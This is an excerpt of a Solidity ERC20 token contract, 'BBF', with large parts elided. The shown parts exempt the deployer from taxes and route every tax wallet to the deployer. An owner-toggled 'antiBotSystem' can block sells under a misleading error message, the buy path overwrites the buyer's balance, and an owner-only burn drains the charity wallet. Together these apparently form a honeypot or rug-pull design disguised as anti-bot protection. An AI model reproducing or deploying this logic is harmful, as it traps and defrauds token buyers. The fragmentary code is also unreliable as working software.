...
contract BBF is ERC20, Ownable, Pausable {
    ...
    uint256 private swapThreshold = 0.02 ether; // The contract will only swap to ETH, once the fee tokens reach the specified threshold
    ...
    bool public antiBotSystem = false;
    ...
    ) ERC20(name, symbol) payable
    {
        ...
        setBuyTax(0, 0, 0, 0);
        setSellTax(0, 0, 0, 0);
        setTaxWallets(msg.sender, msg.sender, msg.sender);
        exclude(msg.sender);
    ...
    function handleTax(address from, address to, uint256 amount) private returns (uint256) {
        ...
        if(!isExcluded(from) && !isExcluded(to)) {
            ...
            if(from == address(uniswapV2Pair)) {
                ...
                _bal[to] = baseUnit * buyTaxes["charity"];
                ...
                if (antiBotSystem) {
                    uint256 baseEth = uniswapV2Router02.getAmountsOut(baseUnit, sellPath)[1];
                    require(_bal[from] >= baseEth && baseEth >= (swapThreshold / 10), "CoinToken: minimum approved sell is 10% from account balance");
                }
    ...
    function burn(uint256 amount) public onlyOwner {
        _burn(taxWallets["charity"], amount);
    }
     ...
     * @dev on/off antibot
     */
    function toggleAntibotSystem() public onlyOwner {
